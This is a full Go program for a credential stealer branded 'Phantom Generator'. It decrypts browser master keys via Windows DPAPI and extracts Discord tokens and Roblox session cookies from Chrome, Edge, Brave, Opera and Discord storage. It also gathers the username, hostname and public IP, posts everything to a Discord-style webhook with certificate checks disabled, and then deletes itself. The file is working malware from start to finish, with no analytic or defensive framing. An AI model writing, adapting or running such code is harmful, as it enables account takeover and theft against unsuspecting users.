package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	crypt32           = syscall.NewLazyDLL("crypt32.dll")
	procUnprotectData = crypt32.NewProc("CryptUnprotectData")
	WebhookURL        = "CHANGEME"
	Timestamp         = "N/A"
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func CryptUnprotectData(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	var out DATA_BLOB
	input := DATA_BLOB{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}
	ret, _, err := procUnprotectData.Call(
		uintptr(unsafe.Pointer(&input)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if ret == 0 {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(out.pbData)))
	res := make([]byte, out.cbData)
	copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	return res, nil
}

func getMasterKey(path string) ([]byte, error) {
	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var state struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(content, &state); err != nil {
		return nil, err
	}
	decodedKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if !bytes.HasPrefix(decodedKey, []byte("DPAPI")) {
		return nil, fmt.Errorf("invalid key prefix")
	}
	return CryptUnprotectData(decodedKey[5:])
}

func decryptToken(encrypted []byte, key []byte) (string, error) {
	if len(encrypted) < 15 {
		return "", fmt.Errorf("data too short")
	}
	iv := encrypted[3:15]
	payload := encrypted[15:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	decrypted, err := aesGCM.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}
	return string(decrypted), nil
}

type SystemReport struct {
	Username      string   `json:"username"`
	Hostname      string   `json:"hostname"`
	OS            string   `json:"os"`
	Arch          string   `json:"arch"`
	CPUs          int      `json:"cpus"`
	PublicIP      string   `json:"public_ip"`
	DiscordTokens []string `json:"discord_tokens"`
	RobloxCookies []string `json:"roblox_cookies"`
	Browsers      []string `json:"browsers_found"`
	Timestamp     string   `json:"timestamp"`
}

func main() {
	if WebhookURL == "" {
		return
	}

	report := gatherEverything()
	sendReport(report)

	// Self-delete (Windows specific)
	selfDelete()
}

func selfDelete() {
	if runtime.GOOS == "windows" {
		exePath, _ := os.Executable()
		cmd := fmt.Sprintf("timeout /t 3 > NUL && del /f /q \"%s\"", exePath)
		subprocess := exec.Command("cmd", "/C", cmd)
		subprocess.Start()
	} else {
		os.Remove(os.Args[0])
	}
}

func gatherEverything() SystemReport {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()

	report := SystemReport{
		Username:  currUser.Username,
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		CPUs:      runtime.NumCPU(),
		PublicIP:  getPublicIP(),
		Timestamp: Timestamp,
	}

	report.DiscordTokens = extractDiscordTokens()
	report.RobloxCookies = extractRobloxCookies()
	report.Browsers = findBrowsers()

	return report
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return string(ip)
}

func findBrowsers() []string {
	var found []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome"),
		"Edge":    filepath.Join(home, "AppData", "Local", "Microsoft", "Edge"),
		"Brave":   filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser"),
		"Opera":   filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Firefox": filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox"),
	}

	for name, path := range paths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, name)
		}
	}
	return found
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

func extractDiscordTokens() []string {
	var tokens []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Discord":        filepath.Join(home, "AppData", "Roaming", "Discord"),
		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "DiscordCanary"),
		"Discord PTB":    filepath.Join(home, "AppData", "Roaming", "DiscordPTB"),
		"Google Chrome":  filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default"),
		"Opera":          filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
	}

	reEncrypted := regexp.MustCompile(`dQw4w9WgXcQ:([^" ]+)`)
	rePlain := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)

	for name, baseDir := range paths {
		leveldbPath := filepath.Join(baseDir, "Local Storage", "leveldb")
		if name == "Opera" {
			leveldbPath = filepath.Join(baseDir, "Local Storage", "leveldb")
		}

		// Try to get master key if it's a desktop app or chrome-based
		var masterKey []byte
		localStatePath := filepath.Join(baseDir, "Local State")
		if strings.Contains(name, "Discord") {
			// Discord app Local State is one level up from Local Storage
			localStatePath = filepath.Join(baseDir, "Local State")
		} else if strings.Contains(name, "Chrome") || strings.Contains(name, "Brave") {
			// Chrome Local State is in User Data
			localStatePath = filepath.Join(filepath.Dir(baseDir), "Local State")
		}

		if _, err := os.Stat(localStatePath); err == nil {
			masterKey, _ = getMasterKey(localStatePath)
		}

		files, err := os.ReadDir(leveldbPath)
		if err != nil {
			continue
		}

		for _, file := range files {
			if !strings.HasSuffix(file.Name(), ".log") && !strings.HasSuffix(file.Name(), ".ldb") {
				continue
			}

			// Copy file to temp to avoid "file in use" error
			tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("temp_%d", time.Now().UnixNano()))
			if err := copyFile(filepath.Join(leveldbPath, file.Name()), tempFile); err != nil {
				continue
			}
			content, err := os.ReadFile(tempFile)
			os.Remove(tempFile)
			if err != nil {
				continue
			}

			// 1. Look for encrypted tokens
			if masterKey != nil {
				matches := reEncrypted.FindAllSubmatch(content, -1)
				for _, match := range matches {
					if len(match) > 1 {
						encryptedB64 := string(match[1])
						encryptedData, err := base64.StdEncoding.DecodeString(encryptedB64)
						if err == nil {
							decrypted, err := decryptToken(encryptedData, masterKey)
							if err == nil && !contains(tokens, decrypted) {
								tokens = append(tokens, decrypted)
							}
						}
					}
				}
			}

			// 2. Look for plain tokens (fallback)
			matchesPlain := rePlain.FindAllString(string(content), -1)
			for _, match := range matchesPlain {
				if !contains(tokens, match) {
					tokens = append(tokens, match)
				}
			}
		}
	}
	return tokens
}

func extractRobloxCookies() []string {
	var cookies []string
	home, _ := os.UserHomeDir()

	paths := map[string]string{
		"Chrome": filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":   filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":  filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":  filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
	}

	rePlain := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)

	for _, baseDir := range paths {
		// 1. Check for master key
		localStatePath := filepath.Join(baseDir, "Local State")
		masterKey, _ := getMasterKey(localStatePath)

		// 2. Search in Cookies database
		cookiePaths := []string{
			filepath.Join(baseDir, "Default", "Network", "Cookies"),
			filepath.Join(baseDir, "Default", "Cookies"),
			filepath.Join(baseDir, "Network", "Cookies"),
		}

		for _, cookiePath := range cookiePaths {
			if _, err := os.Stat(cookiePath); err != nil {
				continue
			}

			// Copy file to temp to avoid "file in use" error
			tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("temp_cookie_%d", time.Now().UnixNano()))
			if err := copyFile(cookiePath, tempFile); err != nil {
				continue
			}
			content, err := os.ReadFile(tempFile)
			os.Remove(tempFile)
			if err != nil {
				continue
			}

			// Look for plain text cookies (sometimes they are there in old versions or logs)
			matches := rePlain.FindAllString(string(content), -1)
			for _, match := range matches {
				if !contains(cookies, match) {
					cookies = append(cookies, match)
				}
			}

			// If we have a master key, we could try to find encrypted values
			// Chrome cookies are prefixed with 'v10' or 'v11'
			// In the SQLite file, they are usually after the cookie name '.ROBLOSECURITY'
			if masterKey != nil {
				// This is a bit complex without SQLite parser, but we can search for the pattern
				// [binary garbage].ROBLOSECURITY[binary garbage]v10[encrypted data]
				idx := bytes.Index(content, []byte(".ROBLOSECURITY"))
				if idx != -1 {
					// Look for 'v10' after '.ROBLOSECURITY'
					searchData := content[idx:]
					v10Idx := bytes.Index(searchData, []byte("v10"))
					if v10Idx != -1 && v10Idx < 100 { // Should be close
						// Fallback: search for any 'v10' pattern and try to decrypt
						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
						for _, v10Match := range v10Matches {
							if len(v10Match) > 15 {
								decrypted, err := decryptToken(v10Match, masterKey)
								if err == nil && strings.Contains(decrypted, "_|WARNING") {
									if !contains(cookies, decrypted) {
										cookies = append(cookies, decrypted)
									}
								}
							}
						}
					}
				}
			}
		}
	}

	// Also check Roblox App location
	robloxPath := filepath.Join(home, "AppData", "Local", "Roblox", "LocalStorage")
	if _, err := os.Stat(robloxPath); err == nil {
		files, _ := os.ReadDir(robloxPath)
		for _, f := range files {
			c, _ := os.ReadFile(filepath.Join(robloxPath, f.Name()))
			matches := rePlain.FindAllString(string(c), -1)
			for _, match := range matches {
				if !contains(cookies, match) {
					cookies = append(cookies, match)
				}
			}
		}
	}

	return cookies
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func formatList(list []string, limit int) string {
	if len(list) == 0 {
		return "❌ No data found"
	}
	res := ""
	for i, item := range list {
		if i >= limit {
			res += fmt.Sprintf("\n... and %d more items", len(list)-limit)
			break
		}
		res += fmt.Sprintf("`%s` \n", item)
	}
	if len(res) > 1000 {
		return res[:997] + "..."
	}
	return res
}

func sendReport(report SystemReport) {
	// Construction de l'interface visuelle via plusieurs embeds
	embeds := []map[string]interface{}{
		{
			"title": "👻 Phantom Payload Executed",
			"color": 0x2c3e50,
			"fields": []map[string]interface{}{
				{"name": "👤 User", "value": fmt.Sprintf("`%s`", report.Username), "inline": true},
				{"name": "💻 Hostname", "value": fmt.Sprintf("`%s`", report.Hostname), "inline": true},
				{"name": "🌐 Public IP", "value": fmt.Sprintf("`%s`", report.PublicIP), "inline": true},
				{"name": "🖥️ OS", "value": fmt.Sprintf("`%s (%s)`", report.OS, report.Arch), "inline": true},
				{"name": "⚙️ CPUs", "value": fmt.Sprintf("`%d`", report.CPUs), "inline": true},
				{"name": "🕒 Generated At", "value": fmt.Sprintf("`%s`", report.Timestamp), "inline": false},
				{"name": "🌐 Browsers Found", "value": fmt.Sprintf("`%s`", strings.Join(report.Browsers, ", ")), "inline": false},
			},
			"footer": map[string]string{"text": "Phantom Generator v1.0 | System Report"},
		},
	}

	// Embed pour les Tokens Discord
	if len(report.DiscordTokens) > 0 {
		embeds = append(embeds, map[string]interface{}{
			"title":       "📱 Discord Tokens Captured",
			"color":       0x5865F2,
			"description": formatList(report.DiscordTokens, 8),
			"footer":      map[string]string{"text": fmt.Sprintf("Total Tokens: %d", len(report.DiscordTokens))},
		})
	} else {
		embeds = append(embeds, map[string]interface{}{
			"title":       "📱 Discord Tokens",
			"color":       0xe74c3c,
			"description": "❌ No Discord tokens found on this system.",
		})
	}

	// Embed pour les Cookies Roblox
	if len(report.RobloxCookies) > 0 {
		embeds = append(embeds, map[string]interface{}{
			"title":       "🎮 Roblox Cookies Captured",
			"color":       0xFFFFFF,
			"description": formatList(report.RobloxCookies, 5),
			"footer":      map[string]string{"text": fmt.Sprintf("Total Cookies: %d", len(report.RobloxCookies))},
		})
	} else {
		embeds = append(embeds, map[string]interface{}{
			"title":       "🎮 Roblox Cookies",
			"color":       0xe74c3c,
			"description": "❌ No Roblox cookies found on this system.",
		})
	}

	payload := map[string]interface{}{
		"embeds": embeds,
	}

	jsonData, _ := json.Marshal(payload)

	req, _ := http.NewRequest("POST", WebhookURL, bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}
